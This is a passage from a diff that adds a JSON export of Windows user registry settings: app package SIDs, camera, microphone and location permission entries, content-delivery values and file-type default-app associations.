+                                        "App.AppXyyhvyb1h1g2k8bkkfmtc0zft4yqmkj2v.mca": "Microsoft.DesktopAppInstaller_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2537927067-2140208811-1083047336-3825492100-1188134376-3459723148-3131426163": {
+                                        "App.AppX46rqe0eha6ypqrxvfyqqtwydysxtw8tt.mca": "Microsoft.Todos_8wekyb3d8bbwe!App",
+                                        "App.AppXerwaxnakpf63hpz2y6nme53r3mgxdn08.mca": "Microsoft.Todos_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2603511428-3224021693-1028932517-3941269705-3349582775-2312504883-4057327947": {
+                                        "Microsoft.Xbox.TCUI.AppX4ynf3hpf0jx5tw2mmscjncbesnd76az0.mca": "Microsoft.Xbox.TCUI_8wekyb3d8bbwe!Microsoft.Xbox.TCUI",
+                                        "Microsoft.Xbox.TCUI.AppX5sz1ax1wgg9t2bhtnkezxey3typpeabq.mca": "Microsoft.Xbox.TCUI_8wekyb3d8bbwe!Microsoft.Xbox.TCUI"
+                                    },
+                                    "S-1-15-2-2679466428-2257802901-1755839644-3032159574-3452485508-990264208-3332697187": {
+                                        "App.AppX9f4sknxr2nry9zvy8tjexrzbzrw1c7tt.mca": "Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe!App",
+                                        "App.AppXja4s6hayh2k4245kjfmt08xp7ffyps0r.mca": "Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-2743877165-1931364543-2468930561-3765762410-1162139025-1178895811-1086226821": {
+                                        "SecHealthUI.AppX07dy52bmnh5t8bj3x4vb63fd4qx1cbs6.mca": "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI",
+                                        "SecHealthUI.AppX81r92dccbwxyyjy4mnydvc1twkecv2nf.mca": "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI",
+                                        "SecHealthUI.AppXe59m6m8r25btnv57cdkqda48ce1h3b52.mca": "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI",
+                                        "SecHealthUI.AppXnc4cxmx59z1hsp2kf3azkfwmsh8ahkjp.mca": "Microsoft.SecHealthUI_8wekyb3d8bbwe!SecHealthUI"
+                                    },
+                                    "S-1-15-2-3132517012-1571311091-3263739450-2968124769-4061529133-2106415361-233808003": {
+                                        "Microsoft.ZuneMusic.AppXtv7ky83ngznmagrmhc5fhfwbktfhrjja.mca": "Microsoft.ZuneMusic_8wekyb3d8bbwe!Microsoft.ZuneMusic",
+                                        "Microsoft.ZuneMusic.AppXw0khkffq60s4jkjhev5cd4pp210hemd1.mca": "Microsoft.ZuneMusic_8wekyb3d8bbwe!Microsoft.ZuneMusic"
+                                    },
+                                    "S-1-15-2-3173323527-1370142926-3440071442-4097462880-1944842275-2641970605-339160986": {
+                                        "App.AppX1kjm6jkfs0aen0vyxez2t1taz3syznke.mca": "Microsoft.GetHelp_8wekyb3d8bbwe!App",
+                                        "App.AppXk80615z2qtjn0fnabr78j6mft0fbshzb.mca": "Microsoft.GetHelp_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-3261124336-967904692-548716175-2724082555-235625598-1533749622-1468861831": {
+                                        "Microsoft.XboxIdentityProvider.AppX58wnk5wqw5wh5y5x1ngvan533yk7fhkm.mca": "Microsoft.XboxIdentityProvider_8wekyb3d8bbwe!Microsoft.XboxIdentityProvider",
+                                        "Microsoft.XboxIdentityProvider.AppXxc7yzxpt5jv4bm92z133yswvjqh14djs.mca": "Microsoft.XboxIdentityProvider_8wekyb3d8bbwe!Microsoft.XboxIdentityProvider"
+                                    },
+                                    "S-1-15-2-3539788797-2700867667-1432428195-1581642-2885308443-3834444517-2495346167": {
+                                        "App.AppX6akfn669rttmqb9dab4br4yzrmk6fmmg.mca": "Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App",
+                                        "App.AppX9faf3c1mkamh8e300g054wegxfnq2aen.mca": "Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-364329911-4150717405-3056445719-2033109410-984633417-3778061428-3365209672": {
+                                        "SettingsUXHostApp.AppXxnb2wgd17pheptmaxx5ykxp7bcmqe4ra.mca": "MicrosoftWindows.CrossDevice_cw5n1h2txyewy!SettingsUXHostApp"
+                                    },
+                                    "S-1-15-2-3828360675-3123616087-1283226262-1036109304-3961725198-2080846782-1645323766": {
+                                        "App.AppX8jn2kb5cwr2a4cjbqvw29hc5jq6bvkm2.mca": "Microsoft.BingSearch_8wekyb3d8bbwe!App",
+                                        "App.AppXyftrhsgr0ymsrhd9f3zmp558eb15j1jt.mca": "Microsoft.BingSearch_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-447965956-1595884426-2614601585-2128949372-556907266-1570989533-1058743812": {
+                                        "App.AppX91srjpcdt7kvgtt11zvh8ernzq0afapy.mca": "Microsoft.WindowsCamera_8wekyb3d8bbwe!App",
+                                        "App.AppXdcj0ksyj4hq6w9xm2pg0k7k2tsh16crh.mca": "Microsoft.WindowsCamera_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-466767348-3739614953-2700836392-1801644223-4227750657-1087833535-2488631167": {
+                                        "App.AppXagmtrxzz3btd8m1e51ke52affh42q70g.mca": "Microsoft.WindowsCalculator_8wekyb3d8bbwe!App",
+                                        "App.AppXb97rv1gyyt2s8s2gby17zt2z7fqscjpt.mca": "Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-508114518-3340871649-811464485-526616082-4258465299-1774086546-1865468257": {
+                                        "AppexNews.AppXd1aex2wcwaethwzde3af5zm7bzw15677.mca": "Microsoft.BingNews_8wekyb3d8bbwe!AppexNews",
+                                        "AppexNews.AppXj33d7wgk5p6wc9kvshensm0w44db1r4k.mca": "Microsoft.BingNews_8wekyb3d8bbwe!AppexNews"
+                                    },
+                                    "S-1-15-2-577703620-721806600-2575725278-1938300505-2177978512-2240326487-1220425747": {
+                                        "App.AppXa2g9313bzvs2knz17p3sr2k6j7ftv102.mca": "Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe!App",
+                                        "App.AppXrqc8rqrdfw94pdkgeb2y6znzvahde82y.mca": "Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-599759058-3479938838-1253218824-33263930-1483063708-2104800716-3218279855": {
+                                        "App.AppX0fbq7vbkaesddsq0ssd3d1jtma45b14x.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppX5d5ney3g3npkhgdwvt4gt6r03sm8d18m.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppX8a6w88secebzyje9nrqc47xt488tkbmc.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppXc3r6y0474dsd37dkjbt6agpdcg26wq8q.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppXgpakq9py0a0xdz6erwp4bt7aanvdxxa3.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppXhcth5d6r8ea098fzkwpq0s1ffaz4v24d.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppXm10n26dqqjjg5v1jckwvj5xqx9df03dk.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App",
+                                        "App.AppXyzmz0szh7h2402cerkk3fftwvngq37kv.mca": "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe!App"
+                                    },
+                                    "S-1-15-2-930279079-3258969966-1203931420-3379063298-1496040207-3203565093-3038441310": {
+                                        "Microsoft.MicrosoftOfficeHub.AppX4nkbtqeypp3er856y2d5wv3q4j4t625k.mca": "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub",
+                                        "Microsoft.MicrosoftOfficeHub.AppXvhez9tbpytkh6zv5q0bx5fj12yay14wg.mca": "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!Microsoft.MicrosoftOfficeHub",
+                                        "OfficeHubHWA.AppXcmsr0b6h6ebjessmp6b5367cjn33z7j5.mca": "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!OfficeHubHWA",
+                                        "OfficeHubHWA.AppXebj0j9rdgc8dv4kbhrhepx7270y7knwb.wwa": "Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe!OfficeHubHWA"
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    "CapabilityAccessManager": {
+                        "ConsentStore": {
+                            "activity": "Allow",
+                            "broadFileSystemAccess": "Allow",
+                            "documentsLibrary": {
+                                "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe": "Allow"
+                            },
+                            "graphicsCaptureProgrammatic": {
+                                "MSTeams_8wekyb3d8bbwe": "Allow"
+                            },
+                            "graphicsCaptureWithoutBorder": {
+                                "MSTeams_8wekyb3d8bbwe": "Allow"
+                            },
+                            "location": {
+                                "Microsoft.GetHelp_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.WindowsCamera_8wekyb3d8bbwe": "Prompt",
+                                "MSTeams_8wekyb3d8bbwe": "Prompt",
+                                "NonPackaged": "Allow"
+                            },
+                            "microphone": {
+                                "Microsoft.GetHelp_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.ScreenSketch_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.WindowsCamera_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe": "Prompt",
+                                "MSTeams_8wekyb3d8bbwe": "Prompt"
+                            },
+                            "musicLibrary": {
+                                "Microsoft.ZuneMusic_8wekyb3d8bbwe": "Allow"
+                            },
+                            "picturesLibrary": {
+                                "Microsoft.WindowsCamera_8wekyb3d8bbwe": "Allow",
+                                "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe": "Allow",
+                                "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe": "Allow"
+                            },
+                            "radios": {
+                                "Microsoft.GetHelp_8wekyb3d8bbwe": "Prompt"
+                            },
+                            "userAccountInformation": {
+                                "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe": "Prompt"
+                            },
+                            "videosLibrary": {
+                                "Microsoft.WindowsCamera_8wekyb3d8bbwe": "Allow",
+                                "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe": "Allow",
+                                "Microsoft.ZuneMusic_8wekyb3d8bbwe": "Allow"
+                            },
+                            "webcam": {
+                                "Microsoft.WindowsCamera_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe": "Prompt",
+                                "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe": "Prompt",
+                                "MSTeams_8wekyb3d8bbwe": "Prompt"
+                            }
+                        }
+                    },
+                    "CDP": "RS4",
+                    "CloudStore": {
+                        "Store": {
+                            "DefaultAccount": {
+                                "CloudCacheInvalidator": "{\n   \"DatabaseInstanceId\" : 11929,\n   \"Sequence\" : 1,\n   \"activityStoreId\" : \"14A14F8C-0EE1-293D-4B6C-5E743EF2B5EA\",\n   \"filter\" : {\n      \"isReadFilter\" : 0,\n      \"originFilterKey\" : 0,\n      \"stateFilterKey\" : 0,\n      \"userActionStateFilter\" : 0\n   }\n}\n"
+                            }
+                        },
+                        "SystemMetaData": "{edf5e673-7c2a-4dd4-ab0f-2d21e7f3ac39}"
+                    },
+                    "ContentDeliveryManager": {
+                        "Renderers": {
+                            "SubscribedContent-310091": "2",
+                            "SubscribedContent-310092": "2",
+                            "SubscribedContent-338380": "2",
+                            "SubscribedContent-338381": "2",
+                            "SubscribedContent-338387": "2",
+                            "SubscribedContent-338388": "2"
+                        },
+                        "Subscriptions": {
+                            "280810": "7",
+                            "280811": "7",
+                            "310093": "",
+                            "338387": "sc-mode=0",
+                            "88000161": "7",
+                            "88000163": "7",
+                            "88000165": "7"
+                        }
+                    },
+                    "DesktopSpotlight": {
+                        "Settings": "%SystemRoot%\\system32\\imageres.dll,-8201"
+                    },
+                    "Explorer": {
+                        "AutoplayHandlers": {
+                            "EventHandlers": {
+                                "PlayCDAudioOnArrival": "",
+                                "PlayEnhancedCDOnArrival": ""
+                            },
+                            "EventHandlersDefaultSelection": "",
+                            "Handlers": {
+                                "vd6zwcfz2g3xc81j98pyxahwstak97s2fpxb0pza3pdjavrdks7g!content!play-cd-audio": "Microsoft.ZuneMusic_11.2312.8.0_x64__8wekyb3d8bbwe",
+                                "vd6zwcfz2g3xc81j98pyxahwstak97s2fpxb0pza3pdjavrdks7g!content!play-enhancedcd-audio": "Microsoft.ZuneMusic_11.2312.8.0_x64__8wekyb3d8bbwe"
+                            },
+                            "UserChosenExecuteHandlers": ""
+                        },
+                        "CD Burning": {
+                            "Drives": {
+                                "Volume{f9aae28d-9beb-11f0-9112-806e6f6e6963}": {
+                                    "Current Media": "CCCOMA_X64FRE_EN-US_DV9"
+                                }
+                            },
+                            "StagingInfo": {
+                                "Volume{f9aae28d-9beb-11f0-9112-806e6f6e6963}": "C:\\Users\\User\\AppData\\Local\\Microsoft\\Windows\\Burn\\Burn"
+                            }
+                        },
+                        "CLSID": {
+                            "{20D04FE0-3AEA-1069-A2D8-08002B30309D}": {
+                                "DefaultIcon": "C:\\WINDOWS\\System32\\imageres.dll,-109"
+                            },
+                            "{59031A47-3F72-44A7-89C5-5595FE6B30EE}": {
+                                "DefaultIcon": "C:\\WINDOWS\\System32\\imageres.dll,-123"
+                            },
+                            "{645FF040-5081-101B-9F08-00AA002F954E}": {
+                                "DefaultIcon": "%SystemRoot%\\System32\\imageres.dll,-54"
+                            },
+                            "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}": {
+                                "DefaultIcon": "C:\\WINDOWS\\System32\\imageres.dll,-25"
+                            }
+                        },
+                        "Desktop": {
+                            "NameSpace": {
+                                "{018D5C66-4533-4307-9B53-224DE2ED1FE6}": "OneDrive",
+                                "{2cc5ca98-6485-489a-920e-b3e88a6ccce3}": "Windows Spotlight"
+                            }
+                        },
+                        "FileExts": {
+                            ".3fr": {
+                                "UserChoice": "ErmfbWx5J3w=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".3g2": {
+                                "UserChoice": "Gdf+DHmHYd0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".3gp": {
+                                "UserChoice": "OB/KO7mYxqM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".3gp2": {
+                                "UserChoice": "BoOcAYO4Eo8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".3gpp": {
+                                "UserChoice": "ZSgNM4MecYA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".3mf": {
+                                "UserChoice": "Qff5xIun3iE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXvhc4p7vz4b485xfp46hhk3fq3grkdgjg"
+                                }
+                            },
+                            ".aac": {
+                                "UserChoice": "ms/AaXOQYNw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".ac3": {
+                                "UserChoice": "FlPXoQQqz9Q=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".adt": {
+                                "UserChoice": "XeQvDFAFGnI=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".adts": {
+                                "UserChoice": "GByPZz64KC0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".amr": {
+                                "UserChoice": "vBVsTjJIW98=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".ari": {
+                                "UserChoice": "4Gzpam3Idpw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".arw": {
+                                "UserChoice": "+XWDkRKGgHk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".asf": {
+                                "UserChoice": "poc44fW7MgQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".avci": {
+                                "UserChoice": "fOfZTeSmyxw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".avi": {
+                                "UserChoice": "WmtGt69x2sY=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".avif": {
+                                "UserChoice": "WMA3Z9VAhhA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".bay": {
+                                "UserChoice": "YsDdA1SeHuY=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".bmp": {
+                                "UserChoice": "nkUABYh8yNs=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".cab": {
+                                "UserChoice": "SValSRzoxF0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "CABFolder"
+                                }
+                            },
+                            ".cap": {
+                                "UserChoice": "R4pPJr/eL48=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".cr2": {
+                                "UserChoice": "9Ww20vAn9PA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".cr3": {
+                                "UserChoice": "8pUf1zXH2yI=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".crw": {
+                                "UserChoice": "4DDu8gBkJUY=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".dcr": {
+                                "UserChoice": "3WNlP6r5A/o=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".dcs": {
+                                "UserChoice": "DA/Bs85Rs0I=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".dib": {
+                                "UserChoice": "50ui/7vky4A=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".divx": {
+                                "UserChoice": "Yr0d/z+wXGY=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".dng": {
+                                "UserChoice": "V6V3pul7kWc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXvvwq6wxamf7qhxd0vn6wm1wwehyxrdd6"
+                                }
+                            },
+                            ".drf": {
+                                "UserChoice": "azvuyZzOnPg=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".ec3": {
+                                "UserChoice": "10R5oB3OzfQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".eip": {
+                                "UserChoice": "HyJdrBOSXss=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".emf": {
+                                "UserChoice": "LmuDPrcelsw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXcesbfs704v2mjbts9dkr42s9vmrhxbkj"
+                                }
+                            },
+                            ".epub": {
+                                "UserChoice": "oWdtB7xME7M=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXvepbp3z66accmsd0x877zbbxjctkpr6t"
+                                }
+                            },
+                            ".erf": {
+                                "UserChoice": "7QN2JX9fsXc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".fbx": {
+                                "UserChoice": "q1Id32RiMIU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k"
+                                }
+                            },
+                            ".fff": {
+                                "UserChoice": "FsPxRsJgjSQ=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".flac": {
+                                "UserChoice": "8qTFbB0iJzk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".gif": {
+                                "UserChoice": "ogXmv/3w3Ww=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".glb": {
+                                "UserChoice": "t0vHh4Sb7iA=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k"
+                                }
+                            },
+                            ".gltf": {
+                                "UserChoice": "fNg8DE3VGlU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXmgw6pxxs62rbgfp9petmdyb4fx7rnd4k"
+                                }
+                            },
+                            ".heic": {
+                                "UserChoice": "2uzqHPMbrrg=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".heif": {
+                                "UserChoice": "rGYQPssnMys=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".hif": {
+                                "UserChoice": "TqFBouPWbsU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".htm": {
+                                "UserChoice": "WHg/G+PP6tg=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            ".html": {
+                                "UserChoice": "dmIZHEN3SX8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeHTM"
+                                }
+                            },
+                            ".ico": {
+                                "UserChoice": "ZvvDS8+zLcc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".ics": {
+                                "UserChoice": "/IFDRcOtAm4=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX18q1gk8kdws5gt2g5c62cxc6qydq7tsw"
+                                }
+                            },
+                            ".iiq": {
+                                "UserChoice": "8MV/iU4FSLY=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".inf": {
+                                "UserChoice": "o7e+Ca9knaE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXzwr976v2e060wada4gabrk1x69h2dbwy"
+                                }
+                            },
+                            ".ini": {
+                                "UserChoice": "6t+T7lNKUt0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXhk4des8gf2xat3wtyzc5q06ny78jhkqx"
+                                }
+                            },
+                            ".jfif": {
+                                "UserChoice": "tQz2CPTq3oM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".jpe": {
+                                "UserChoice": "JQrJlL0x+5U=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".jpeg": {
+                                "UserChoice": "IAc/5G2Fcgw=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".jpg": {
+                                "UserChoice": "XgLtT6qSj2I=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".jxr": {
+                                "UserChoice": "vd2E9ZXiQwM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX43hnxtbyyps62jhe9sqpdzxn1790zetc"
+                                }
+                            },
+                            ".k25": {
+                                "UserChoice": "SCZLOC3msq8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".kdc": {
+                                "UserChoice": "I6xamxzbEnY=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".log": {
+                                "UserChoice": "f81HVj/mMYo=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX4ztfk9wxr86nxmzzq47px0nh0e58b8fw"
+                                }
+                            },
+                            ".m1v": {
+                                "UserChoice": "JtbsXOgbxE0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m2t": {
+                                "UserChoice": "Go2xAJ8DMX8=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m2ts": {
+                                "UserChoice": "TimwgElwuRM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m2v": {
+                                "UserChoice": "WbaesVYnpgE=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m3u": {
+                                "UserChoice": "d80KMK9oG8U=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m4a": {
+                                "UserChoice": "8I+p9lvX0vM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m4r": {
+                                "UserChoice": "84ivwLasSYc=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".m4v": {
+                                "UserChoice": "/IhFGeFt0Zk=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mef": {
+                                "UserChoice": "ZsNG939fu+M=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".mht": {
+                                "UserChoice": "Rg2JSOzzstg=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeMHT"
+                                }
+                            },
+                            ".mhtml": {
+                                "UserChoice": "iVOFF68Dpx0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "MSEdgeMHT"
+                                }
+                            },
+                            ".mka": {
+                                "UserChoice": "KQh9CtvoSuM=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mkv": {
+                                "UserChoice": "kMLGBnFmOnU=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mod": {
+                                "UserChoice": "eKpRzr3kE68=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".mos": {
+                                "UserChoice": "88LHyI76lM0=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppX9rkaq77s0jzh1tyccadx9ghba15r6t3h"
+                                }
+                            },
+                            ".mov": {
+                                "UserChoice": "YFa23/qzO1E=",
+                                "UserChoiceLatest": {
+                                    "ProgId": "AppXqj98qxeaynz6dv4459ayz6bnqxbyaqcs"
+                                }
+                            },
+                            ".MP2": {
